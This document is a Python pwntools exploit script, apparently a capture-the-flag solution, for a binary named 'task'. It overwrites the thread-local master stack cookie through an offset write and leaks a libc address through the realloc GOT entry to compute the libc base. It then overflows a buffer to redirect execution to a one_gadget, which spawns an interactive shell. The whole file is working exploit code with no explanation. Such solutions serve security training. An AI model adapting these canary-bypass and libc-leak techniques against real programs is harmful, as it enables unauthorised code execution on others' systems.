from pwn import *

offset_from_mmap_to_tls_master_cookie = 10229096
offset_from_mmap_to_libc_got_realloc_plt = 10195000
leak_offset = 0x25056
one_gadget_offset = 0xe664b

if __name__ == "__main__":

	#p = process( ["./ld-2.29.so", "--library-path", "libs/", "./task"] )
	p = process( "./task" )
	#p = remote( 'localhost', 33066 )
	
	libc = ELF( "./libs/libc.so.6" )

	# gdb.attach( p, '''
	# 	file task
	# 	break *read_sign
	# 	''' 
	# )
	# login
	p.recvuntil( "> " )
	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( "\n" )
	p.recvuntil( ": " )
	p.send( "\n" )
		
	# make teleport
	p.recvuntil( "> " )
	p.send( "1\n" )

	# teleporation
	p.recvuntil( "> " )
	p.send( "2\n" )
	p.recvuntil( ": " )

	# send master cookie offset
	p.send( str( offset_from_mmap_to_tls_master_cookie ) + "\n" )
	p.recvuntil( ": " )

	# send payload to overwrite stack cookie on current frame
	payload = 'b' * 264 + 'a' * 7 + "\n"
	p.send( payload )

	p.recvuntil( ": " )
	p.send( "a" * 7 + '\n' )

	p.recvuntil( "> " )
	p.send( "1\n" )

	p.recvuntil( ": " )
	p.send( str( offset_from_mmap_to_libc_got_realloc_plt ) + "\n" )

	p.recvuntil( ": " )
	p.send( "a\n" )

	p.recvuntil( "> " )

	# get leak
	p.send( "3\n" )

	leak = u64( p.recvline().strip() )
	libc_base = leak - leak_offset

	print "leak = 0x%x" % leak 
	print "libc_base = 0x%x" % libc_base 

	p.recvuntil( "> " )
	p.send( "2\n" )

	one_shot = libc_base + one_gadget_offset
	payload = 'b' * 264 + 'a' * 7 + '\x00'
	payload += 'c' * 8 # rbp
	payload += p64( one_shot )
	payload + "\x00" * 0x60

	p.recvuntil( ": " )
	p.send( "1\n" ) # send idx 
	p.recvuntil( ": " )
	p.send( payload + '\n' )
	p.interactive()

	p.close()




